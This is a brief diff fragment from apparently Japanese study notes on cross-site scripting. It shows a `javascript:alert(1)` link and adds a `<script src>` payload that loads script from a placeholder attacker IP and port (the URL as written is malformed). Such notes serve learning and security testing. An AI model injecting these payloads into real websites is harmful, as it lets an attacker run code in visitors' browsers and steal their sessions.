@@ -54,3 +54,8 @@ Cookie の値 (ページ内でユーザー名を表示する際など)
 ```
 <a href="javascript:alert(1)">Click Me</a>
 ```
+
+```
+<script src="http:/MYIP:ポート番号"></script>
+```
+
